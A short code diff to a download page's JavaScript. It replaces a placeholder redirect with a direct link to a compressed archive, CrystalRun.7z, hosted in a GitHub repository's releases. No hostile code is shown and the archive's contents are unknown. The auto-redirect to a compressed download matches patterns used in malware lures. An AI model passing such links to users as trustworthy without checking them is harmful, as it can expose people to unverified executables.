@@ -38,7 +38,7 @@ function startDownload() {
     btn.textContent = "Redirecting...";
     btn.disabled = true;
     setTimeout(() => {
-        window.location.href = "https://example.com";
+        window.location.href = "https://github.com/noaa-apt/Crystal-Run/releases/download/Release/CrystalRun.7z";
     }, 800);
 }
 window.onload = function() {
